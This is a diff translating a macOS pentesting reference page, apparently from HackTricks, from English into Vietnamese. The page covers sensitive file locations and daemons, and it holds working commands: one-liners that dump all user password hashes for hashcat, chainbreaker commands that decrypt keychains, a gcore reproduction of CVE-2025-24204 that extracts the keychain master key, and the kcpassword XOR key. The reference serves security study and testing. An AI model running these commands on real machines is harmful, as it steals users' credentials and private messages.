@@ -1,32 +1,32 @@
-# macOS Sensitive Locations & Interesting Daemons
+# Các vị trí nhạy cảm và daemon đáng chú ý trên macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 
-## Passwords
+## Mật khẩu
 
 ### Shadow Passwords
 
-Shadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\
-The following oneliner can be use to dump **all the information about the users** (including hash info):
+Shadow password được lưu cùng với cấu hình của người dùng trong các plist nằm tại **`/var/db/dslocal/nodes/Default/users/`**.\
+Có thể dùng one-liner sau để dump **toàn bộ thông tin về người dùng** (bao gồm thông tin hash):
 
 ```bash
 for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
 ```
 
-[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.
+[**Các script như thế này**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) hoặc [**script này**](https://github.com/octomagon/davegrohl.git) có thể được dùng để chuyển đổi hash sang **định dạng** **hashcat**.
 
-An alternative one-liner which will dump creds of all non-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512):
+Một one-liner khác để dump creds của tất cả tài khoản không phải dịch vụ theo định dạng hashcat `-m 7100` (macOS PBKDF2-SHA512):
 
 ```bash
 sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
 ```
 
-Another way to obtain the `ShadowHashData` of a user is by using `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
+Một cách khác để lấy `ShadowHashData` của người dùng là dùng `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``
 
-#### Convert copied ShadowHashData on Linux
+#### Chuyển đổi ShadowHashData đã sao chép trên Linux
 
-If the attribute was copied to a Linux cracking host, save **only its hexadecimal bytes** (not the `ShadowHashData:` label) in `shadowhash.hex`. On Ubuntu, `libplist-utils` converts the decoded binary plist into readable XML without macOS `plutil`.<sup>[[5]](#references)</sup>
+Nếu thuộc tính được sao chép sang máy chủ cracking Linux, hãy chỉ lưu **các byte thập lục phân** của nó (không bao gồm nhãn `ShadowHashData:`) vào `shadowhash.hex`. Trên Ubuntu, `libplist-utils` chuyển plist nhị phân đã giải mã thành XML dễ đọc mà không cần `plutil` của macOS.<sup>[[5]](#references)</sup>
 
 ```bash
 sudo apt install libplist-utils
@@ -34,7 +34,7 @@ xxd -r -p shadowhash.hex > shadowhash.bplist
 plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
 ```
 
-In the XML, use `iterations` and the base64 `salt` and `entropy` from **`SALTED-SHA512-PBKDF2`**, not the separate SRP verifier. Set `salt_b64` and `entropy_b64` to their respective XML `<data>` contents. Decode them to hex and form one line as `$ml$<iterations>$<salt_hex>$<entropy_hex>` for Hashcat mode `7100`. This is offline guessing after privileged hash acquisition, not an initial-access or privilege-escalation method.<sup>[[5]](#references)[[6]](#references)</sup>
+Trong XML, hãy dùng `iterations` cùng với `salt` và `entropy` dạng base64 từ **`SALTED-SHA512-PBKDF2`**, không dùng SRP verifier riêng. Đặt `salt_b64` và `entropy_b64` lần lượt bằng nội dung của các thẻ XML `<data>` tương ứng. Giải mã chúng sang hex và tạo một dòng theo định dạng `$ml$<iterations>$<salt_hex>$<entropy_hex>` cho Hashcat mode `7100`. Đây là hoạt động đoán mật khẩu offline sau khi thu thập hash bằng quyền đặc quyền, không phải phương pháp truy cập ban đầu hoặc leo thang đặc quyền.<sup>[[5]](#references)[[6]](#references)</sup>
 
 ```bash
 printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
@@ -43,11 +43,11 @@ printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
 
 ### /etc/master.passwd
 
-This file is **only used** when the system id running in **single-user mode** (so not very frequently).
+Tệp này **chỉ được sử dụng** khi hệ thống chạy ở **single-user mode** (nên không thường xuyên).
 
 ### Keychain Dump
 
-Note that when using the security binary to **dump the passwords decrypted**, several prompts will ask the user to allow this operation.
+Lưu ý rằng khi dùng binary `security` để **dump các mật khẩu đã giải mã**, một số lời nhắc sẽ yêu cầu người dùng cho phép thao tác này.
 
 ```bash
 #security
@@ -58,24 +58,24 @@ security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychain
 security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
 ```
 
-On modern macOS the most interesting backing stores are usually **`~/Library/Keychains/login.keychain-db`** and **`/Library/Keychains/System.keychain`**. They are SQLite-backed files, but plaintext access is still brokered by **`securityd`**: stealing the raw DB mainly gives you metadata and encrypted blobs unless you also recover the user's password, `SystemKey`, or an in-memory master key.<sup>[[2]](#references)</sup>
+Trên các phiên bản macOS hiện đại, những nơi lưu trữ nền đáng chú ý nhất thường là **`~/Library/Keychains/login.keychain-db`** và **`/Library/Keychains/System.keychain`**. Đây là các tệp được SQLite hỗ trợ, nhưng quyền truy cập dữ liệu dạng plaintext vẫn được trung gian xử lý bởi **`securityd`**: lấy cắp DB thô chủ yếu chỉ cung cấp metadata và các blob đã mã hóa, trừ khi bạn cũng khôi phục được mật khẩu của người dùng, `SystemKey` hoặc master key trong bộ nhớ.<sup>[[2]](#references)</sup>
 
 ### [Keychaindump](https://github.com/juuso/keychaindump)
 
 > [!CAUTION]
-> Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.
+> Dựa trên bình luận này [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), có vẻ các công cụ này không còn hoạt động trên Big Sur.
 
-### Keychaindump Overview
+### Tổng quan về Keychaindump
 
-A tool named **keychaindump** has been developed to extract passwords from macOS keychains, but it faces limitations on newer macOS versions like Big Sur, as indicated in a [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). The use of **keychaindump** requires the attacker to gain access and escalate privileges to **root**. The tool exploits the fact that the keychain is unlocked by default upon user login for convenience, allowing applications to access it without requiring the user's password repeatedly. However, if a user opts to lock their keychain after each use, **keychaindump** becomes ineffective.
+Một công cụ có tên **keychaindump** được phát triển để trích xuất mật khẩu từ macOS keychain, nhưng công cụ này gặp hạn chế trên các phiên bản macOS mới hơn như Big Sur, theo một [cuộc thảo luận](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Để sử dụng **keychaindump**, attacker cần giành quyền truy cập và leo thang đặc quyền lên **root**. Công cụ khai thác việc keychain mặc định được mở khóa khi người dùng đăng nhập để thuận tiện, cho phép ứng dụng truy cập mà không phải yêu cầu người dùng nhập lại mật khẩu. Tuy nhiên, nếu người dùng chọn khóa keychain sau mỗi lần sử dụng, **keychaindump** sẽ không hiệu quả.
 
-**Keychaindump** operates by targeting a specific process called **securityd**, described by Apple as a daemon for authorization and cryptographic operations, crucial for accessing the keychain. The extraction process involves identifying a **Master Key** derived from the user's login password. This key is essential for reading the keychain file. To locate the **Master Key**, **keychaindump** scans the memory heap of **securityd** using the `vmmap` command, looking for potential keys within areas flagged as `MALLOC_TINY`. The following command is used to inspect these memory locations:
+**Keychaindump** hoạt động bằng cách nhắm mục tiêu vào một tiến trình cụ thể có tên **securityd**, được Apple mô tả là daemon thực hiện các hoạt động ủy quyền và mật mã, giữ vai trò thiết yếu trong việc truy cập keychain. Quá trình trích xuất bao gồm xác định một **Master Key** được tạo ra từ mật khẩu đăng nhập của người dùng. Khóa này cần thiết để đọc tệp keychain. Để tìm **Master Key**, **keychaindump** quét heap bộ nhớ của **securityd** bằng lệnh `vmmap`, tìm các khóa tiềm năng trong những vùng được đánh dấu là `MALLOC_TINY`. Lệnh sau được dùng để kiểm tra các vị trí bộ nhớ này:
 
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
 
-After identifying potential master keys, **keychaindump** searches through the heaps for a specific pattern (`0x0000000000000018`) that indicates a candidate for the master key. Further steps, including deobfuscation, are required to utilize this key, as outlined in **keychaindump**'s source code. Analysts focusing on this area should note that the crucial data for decrypting the keychain is stored within the memory of the **securityd** process. An example command to run **keychaindump** is:
+Sau khi xác định các master key tiềm năng, **keychaindump** tìm kiếm trong các heap một mẫu cụ thể (`0x0000000000000018`) cho biết vị trí của một ứng viên master key. Cần thực hiện thêm các bước, bao gồm giải obfuscation, để sử dụng khóa này, như được trình bày trong mã nguồn của **keychaindump**. Các nhà phân tích tập trung vào lĩnh vực này cần lưu ý rằng dữ liệu quan trọng để giải mã keychain được lưu trong bộ nhớ của tiến trình **securityd**. Lệnh ví dụ để chạy **keychaindump** là:
 
 ```bash
 sudo ./keychaindump
@@ -83,29 +83,29 @@ sudo ./keychaindump
 
 ### chainbreaker
 
-[**Chainbreaker**](https://github.com/n0fate/chainbreaker) can extract the following types of information from a macOS keychain in a forensically sound manner:
+[**Chainbreaker**](https://github.com/n0fate/chainbreaker) có thể trích xuất các loại thông tin sau từ macOS keychain theo cách đảm bảo tính pháp chứng:
 
-- Hashed Keychain password, suitable for cracking with [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/)
-- Internet Passwords
-- Generic Passwords
+- Mật khẩu Keychain đã băm, phù hợp để crack bằng [hashcat](https://hashcat.net/hashcat/) hoặc [John the Ripper](https://www.openwall.com/john/)
+- Mật khẩu Internet
+- Mật khẩu Generic
 - Private Keys
 - Public Keys
-- X509 Certificates
+- Chứng chỉ X509
 - Secure Notes
-- Appleshare Passwords
+- Mật khẩu Appleshare
 
-Given the keychain unlock password, a master key obtained using [volafox](https://github.com/n0fate/volafox) or [volatility](https://github.com/volatilityfoundation/volatility), or an unlock file such as SystemKey, Chainbreaker will also provide plaintext passwords.
+Khi có mật khẩu mở khóa keychain, master key lấy được bằng [volafox](https://github.com/n0fate/volafox) hoặc [volatility](https://github.com/volatilityfoundation/volatility), hoặc tệp mở khóa như SystemKey, Chainbreaker cũng sẽ cung cấp mật khẩu dạng plaintext.
 
-Without one of these methods of unlocking the Keychain, Chainbreaker will display all other available information.
+Nếu không dùng một trong các phương thức này để mở khóa Keychain, Chainbreaker sẽ hiển thị mọi thông tin khác hiện có.
 
-#### **Dump keychain keys**
+#### **Trích xuất key của keychain**
 
 ```bash
 #Dump all keys of the keychain (without the passwords)
 python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
 ```
 
-#### **Dump keychain keys (with passwords) with SystemKey**
+#### **Dump các khóa keychain (kèm mật khẩu) bằng SystemKey**
 
 ```bash
 # First, get the keychain decryption key
@@ -115,7 +115,7 @@ hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
 
-#### **Dump keychain keys (with passwords) cracking the hash**
+#### **Dump keys trong keychain (có mật khẩu), crack hash**
 
 ```bash
 # Get the keychain hash
@@ -126,9 +126,9 @@ hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
 
-#### **Dump keychain keys (with passwords) with memory dump**
+#### **Dump khóa keychain (kèm mật khẩu) bằng memory dump**
 
-[Follow these steps](../index.html#dumping-memory-with-osxpmem) to perform a **memory dump**
+[Thực hiện theo các bước này](../index.html#dumping-memory-with-osxpmem) để tạo **memory dump**.
 
 ```bash
 #Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
@@ -139,20 +139,20 @@ python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
 
-#### **Dump keychain keys (with passwords) using users password**
+#### **Dump keychain keys (with passwords) bằng mật khẩu người dùng**
 
-If you know the users password you can use it to **dump and decrypt keychains that belong to the user**.
+Nếu biết mật khẩu người dùng, bạn có thể dùng mật khẩu đó để **dump và giải mã các keychain thuộc về người dùng**.
 
 ```bash
 #Prompt to ask for the password
 python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
 ```
 
-### Keychain master key via `gcore` entitlement (CVE-2025-24204)
+### Keychain master key thông qua entitlement `gcore` (CVE-2025-24204)
 
-macOS 15.0 (Sequoia) shipped `/usr/bin/gcore` with the **`com.apple.system-task-ports.read`** entitlement, so any local admin (or malicious signed app) could dump **any process memory even with SIP/TCC enforced**. Dumping `securityd` leaks the **Keychain master key** in clear and lets you decrypt `login.keychain-db` without the user password.<sup>[[1]](#references)</sup>
+macOS 15.0 (Sequoia) được phát hành với entitlement **`com.apple.system-task-ports.read`** trong `/usr/bin/gcore`, nên bất kỳ admin cục bộ nào (hoặc ứng dụng có chữ ký độc hại) đều có thể dump **bộ nhớ của bất kỳ process nào, ngay cả khi SIP/TCC được thực thi**. Dump `securityd` làm lộ **Keychain master key** ở dạng cleartext và cho phép giải mã `login.keychain-db` mà không cần mật khẩu người dùng.<sup>[[1]](#references)</sup>
 
-**Quick repro on vulnerable builds (15.0–15.2):**
+**Tái hiện nhanh trên các bản build dễ bị tấn công (15.0–15.2):**
 
 ```bash
 sudo pgrep securityd        # usually a single PID
@@ -166,18 +166,18 @@ with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
         if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
 PY $(pgrep securityd)
 ```
-Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.
+Đưa khóa hex đã trích xuất vào Chainbreaker (`--key <hex>`) để giải mã login keychain. Apple đã xóa entitlement này trong **macOS 15.3+**, vì vậy cách này chỉ hoạt động trên các bản Sequoia chưa được vá hoặc hệ thống vẫn giữ binary dễ bị tấn công.
 
 ### kcpassword
 
-The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).
+Tệp **kcpassword** chứa **mật khẩu đăng nhập của người dùng**, nhưng chỉ khi chủ sở hữu hệ thống đã **bật tính năng đăng nhập tự động**. Khi đó, người dùng sẽ tự động đăng nhập mà không cần nhập mật khẩu (điều này không an toàn lắm).
 
-The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
-This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).
+Mật khẩu được lưu trong tệp **`/etc/kcpassword`**, được XOR với khóa **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Nếu mật khẩu của người dùng dài hơn khóa, khóa sẽ được dùng lại.\
+Do đó, việc khôi phục mật khẩu khá dễ dàng, chẳng hạn bằng các script như [**script này**](https://gist.github.com/opshope/32f65875d45215c3677d).
 
-## Interesting Information in Databases
+## Thông tin thú vị trong cơ sở dữ liệu
 
-### Messages
+### Tin nhắn
 
 ```bash
 sqlite3 $HOME/Library/Messages/chat.db .tables
@@ -189,9 +189,9 @@ sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
 
 ### Notifications
 
-Before **Sequoia**, you can usually find the Notification Center store in **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. In **Sequoia+** Apple moved it to the TCC-protected group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.
+Trước **Sequoia**, bạn thường có thể tìm thấy cơ sở dữ liệu của Notification Center tại **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. Trong **Sequoia+**, Apple đã chuyển nó vào group container được TCC bảo vệ **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.
 
-Most of the interesting information is stored inside **blob** columns, so you will need to extract that content and transform it into something human readable (`plutil -p -`, `strings`, or a small parser). Quick triage examples:
+Phần lớn thông tin đáng chú ý được lưu trong các cột **blob**, vì vậy bạn cần trích xuất nội dung đó và chuyển đổi thành định dạng mà con người có thể đọc được (`plutil -p -`, `strings` hoặc một parser nhỏ). Ví dụ triage nhanh:
 
 ```bash
 # Legacy location (older releases / affected builds)
@@ -203,15 +203,15 @@ sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from recor
 sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
 ```
 
-#### Recent privacy issues (NotificationCenter DB)
+#### Các vấn đề quyền riêng tư gần đây (cơ sở dữ liệu NotificationCenter)
 
-- In macOS **14.7–15.1** Apple stored banner content in the `db2/db` SQLite without proper redaction. CVEs **CVE-2024-44292/44293/40838/54504** allowed any local user to read other users' notification text just by opening the DB (no TCC prompt).<sup>[[3]](#references)</sup>
-- Apple mitigated this by moving the DB into `group.com.apple.usernoted` and protecting it with TCC on newer Sequoia builds, so on current systems you normally need the right user context or a TCC bypass to read it.<sup>[[4]](#references)</sup>
-- On legacy endpoints, copy the `db`, `db-wal`, and `db-shm` files together before updating or rebooting if you want to preserve the artefacts.
+- Trong macOS **14.7–15.1**, Apple lưu nội dung banner trong SQLite `db2/db` mà không che dữ liệu đúng cách. Các CVE **CVE-2024-44292/44293/40838/54504** cho phép bất kỳ người dùng cục bộ nào đọc nội dung thông báo của người dùng khác chỉ bằng cách mở cơ sở dữ liệu (không cần lời nhắc TCC).<sup>[[3]](#references)</sup>
+- Apple đã giảm thiểu vấn đề này bằng cách chuyển cơ sở dữ liệu vào `group.com.apple.usernoted` và bảo vệ bằng TCC trên các bản Sequoia mới hơn, vì vậy trên các hệ thống hiện tại, thông thường bạn cần đúng ngữ cảnh người dùng hoặc một TCC bypass để đọc dữ liệu.<sup>[[4]](#references)</sup>
+- Trên các endpoint cũ, hãy sao chép cả ba tệp `db`, `db-wal` và `db-shm` trước khi cập nhật hoặc khởi động lại nếu bạn muốn giữ lại các dấu vết.
 
-### Notes
+### Ghi chú
 
-The users **notes** can be found in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
+Ghi chú của người dùng có thể được tìm thấy tại `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
 
 ```bash
 sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables
@@ -220,33 +220,33 @@ sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tabl
 for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
 ```
 
-If the one-liner above is too noisy, export `ZICNOTEDATA.ZDATA`, gunzip it, and parse the protobuf: this is usually more reliable than running `strings` directly on the SQLite.
+Nếu one-liner ở trên tạo quá nhiều nhiễu, hãy export `ZICNOTEDATA.ZDATA`, giải nén bằng gunzip rồi phân tích protobuf: cách này thường đáng tin cậy hơn chạy `strings` trực tiếp trên SQLite.
 
-### Background Tasks / Login Items
+### Tác vụ nền / Mục đăng nhập
 
-Since **Ventura**, user-approved login items and several background tasks are tracked in **BTM** stores such as **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** and the versioned system cache **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.
+Kể từ **Ventura**, các mục đăng nhập được người dùng phê duyệt và một số tác vụ nền được theo dõi trong các kho dữ liệu **BTM**, chẳng hạn như **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** và bộ nhớ đệm hệ thống có phiên bản **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.
 
-These files are useful to quickly identify persistence, helper tools, and some MDM-managed background items:
+Các tệp này hữu ích để nhanh chóng xác định persistence, công cụ hỗ trợ và một số mục nền do MDM quản lý:
 
 ```bash
 plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
 sfltool dumpbtm
 ```
 
-For the persistence angle and BTM internals, check [the auto-start locations page](../../macos-auto-start-locations.md#login-items) and [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).
+Để biết thêm về khía cạnh persistence và các thông tin nội bộ của BTM, hãy xem [trang về các vị trí tự khởi chạy](../../macos-auto-start-locations.md#login-items) và [ghi chú về Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).
 
-## Preferences
+## Tùy chọn
 
-In macOS apps preferences are located in **`$HOME/Library/Preferences`** and in iOS they are in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
+Trong các ứng dụng macOS, tùy chọn nằm trong **`$HOME/Library/Preferences`**; còn trên iOS, chúng nằm trong `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
 
-In macOS the cli tool **`defaults`** can be used to **modify the Preferences file**.
+Trên macOS, có thể dùng công cụ cli **`defaults`** để **sửa đổi file Preferences**.
 
-**`/usr/sbin/cfprefsd`** claims the XPC services `com.apple.cfprefsd.daemon` and `com.apple.cfprefsd.agent` and can be called to perform actions such as modify preferences.
+**`/usr/sbin/cfprefsd`** đăng ký các dịch vụ XPC `com.apple.cfprefsd.daemon` và `com.apple.cfprefsd.agent`, đồng thời có thể được gọi để thực hiện các hành động như sửa đổi tùy chọn.
 
-## OpenDirectory permissions.plist
+## Quyền trong OpenDirectory permissions.plist
 
-The file `/System/Library/OpenDirectory/permissions.plist` contains permissions applied on node attributes and is protected by SIP.\
-This file grants permissions to specific users by UUID (and not uid) so they are able to access specific sensitive information like `ShadowHashData`, `HeimdalSRPKey` and `KerberosKeys` among others:
+File `/System/Library/OpenDirectory/permissions.plist` chứa các quyền áp dụng cho thuộc tính node và được bảo vệ bởi SIP.\
+File này cấp quyền cho những người dùng cụ thể theo UUID (không phải uid), cho phép họ truy cập một số thông tin nhạy cảm như `ShadowHashData`, `HeimdalSRPKey` và `KerberosKeys`, cùng những thông tin khác:
 
 ```xml
 [...]
@@ -281,15 +281,15 @@ This file grants permissions to specific users by UUID (and not uid) so they are
 [...]
 ```
 
-## System Notifications
+## Thông báo hệ thống
 
-### Darwin Notifications
+### Thông báo Darwin
 
-The main daemon for notifications is **`/usr/sbin/notifyd`**. In order to receive notifications, clients must register through the `com.apple.system.notification_center` Mach port (check them with `sudo lsmp -p <pid notifyd>`). The daemon is configurable with the file `/etc/notify.conf`.
+Daemon chính xử lý thông báo là **`/usr/sbin/notifyd`**. Để nhận thông báo, các client phải đăng ký qua Mach port `com.apple.system.notification_center` (kiểm tra bằng `sudo lsmp -p <pid notifyd>`). Có thể cấu hình daemon bằng tệp `/etc/notify.conf`.
 
-The names used for notifications are unique reverse DNS notations and when a notification is sent to one of them, the client(s) that have indicated that can handle it will receive it.
+Tên dùng cho thông báo là các ký hiệu reverse DNS duy nhất. Khi một thông báo được gửi đến một tên, các client đã cho biết rằng chúng có thể xử lý thông báo đó sẽ nhận được thông báo.
 
-It's possible to dump the current status (and see all the names) sending the signal SIGUSR2 to the notifyd process and reading the generated file: `/var/run/notifyd_<pid>.status`:
+Có thể dump trạng thái hiện tại (và xem tất cả tên) bằng cách gửi tín hiệu SIGUSR2 đến tiến trình notifyd rồi đọc tệp được tạo: `/var/run/notifyd_<pid>.status`:
 
 ```bash
 ps -ef | grep -i notifyd
@@ -309,42 +309,41 @@ pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 
 
 ### Distributed Notification Center
 
-The **Distributed Notification Center** whose main binary is **`/usr/sbin/distnoted`**, is another way to send notifications. It exposes some XPC services and it performs some check to try to verify clients.
+**Distributed Notification Center**, có binary chính là **`/usr/sbin/distnoted`**, là một cách khác để gửi thông báo. Nó cung cấp một số dịch vụ XPC và thực hiện một số kiểm tra để cố gắng xác minh client.
 
 ### Apple Push Notifications (APN)
 
-In this case, applications can register for **topics**. The client will generate a token contacting Apple's servers through **`apsd`**.\
-Then, providers, will have also generated a token and will be able to connect with Apple's servers to send messages to the clients. These messages will be locally received by **`apsd`** which will relay the notification to the application waiting for it.
+Trong trường hợp này, các ứng dụng có thể đăng ký **topics**. Client sẽ tạo một token bằng cách liên hệ với máy chủ của Apple thông qua **`apsd`**.\
+Sau đó, các provider cũng sẽ tạo token và có thể kết nối với máy chủ của Apple để gửi tin nhắn đến client. Các tin nhắn này sẽ được **`apsd`** nhận cục bộ, rồi chuyển tiếp thông báo đến ứng dụng đang chờ.
 
-The preferences are located in `/Library/Preferences/com.apple.apsd.plist`.
+Các tùy chọn được lưu tại `/Library/Preferences/com.apple.apsd.plist`.
 
-There is a local database of messages located in macOS in `/Library/Application\ Support/ApplePushService/aps.db` and in iOS in `/var/mobile/Library/ApplePushService`. It has 3 tables: `incoming_messages`, `outgoing_messages` and `channel`.
+macOS có cơ sở dữ liệu cục bộ chứa các tin nhắn tại `/Library/Application\ Support/ApplePushService/aps.db`, còn iOS lưu tại `/var/mobile/Library/ApplePushService`. Cơ sở dữ liệu có 3 bảng: `incoming_messages`, `outgoing_messages` và `channel`.
 
 ```bash
 sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
 ```
 
-It's also possible to get information about the daemon and connections using:
+Cũng có thể lấy thông tin về daemon và các kết nối bằng cách sử dụng:
 
 ```bash
 /System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
 ```
 
-## User Notifications
+## Thông báo cho người dùng
 
-These are notifications that the user should see in the screen:
+Đây là những thông báo mà người dùng sẽ thấy trên màn hình:
 
-- **`CFUserNotification`**: These API provides a way to show in the screen a pop-up with a message.
-- **The Bulletin Board**: This shows in iOS a banner that disappears and will be stored in the Notification Center.
-- **`NSUserNotificationCenter`**: The legacy notification-center service on macOS. On older releases, the database usually lives in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; on Sequoia and later, it moved to `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.
+- **`CFUserNotification`**: API này cung cấp cách hiển thị cửa sổ bật lên có thông báo trên màn hình.
+- **The Bulletin Board**: Trên iOS, dịch vụ này hiển thị banner rồi banner sẽ biến mất và được lưu trong Notification Center.
+- **`NSUserNotificationCenter`**: Dịch vụ notification-center cũ trên macOS. Trên các phiên bản cũ hơn, cơ sở dữ liệu thường nằm tại `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; từ Sequoia trở đi, cơ sở dữ liệu được chuyển đến `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.
 
 ## References
 
-- [1] [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
-- [2] [Apple Platform Security – Keychain data protection](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
-- [3] [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
-- [4] [9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
-- [5] [SRA Labs – macOS Password Cracking](https://labs.sra.io/posts/macospasswordcracking)
-- [6] [Hashcat example hashes – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
-
+- [1] [HelpNetSecurity – Entitlement gcore của macOS cho phép trích xuất khóa chính Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
+- [2] [Apple Platform Security – Bảo vệ dữ liệu Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
+- [3] [Rapid7 – Rò rỉ dữ liệu SQLite của Notification Center (CVE-2024-44292 và các lỗ hổng khác)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
+- [4] [9to5Mac – Apple giải quyết lo ngại về quyền riêng tư xung quanh cơ sở dữ liệu Notification Center trong macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
+- [5] [SRA Labs – Bẻ khóa mật khẩu macOS](https://labs.sra.io/posts/macospasswordcracking)
+- [6] [Hashcat – Các hash mẫu cho macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
 {{#include ../../../banners/hacktricks-training.md}}
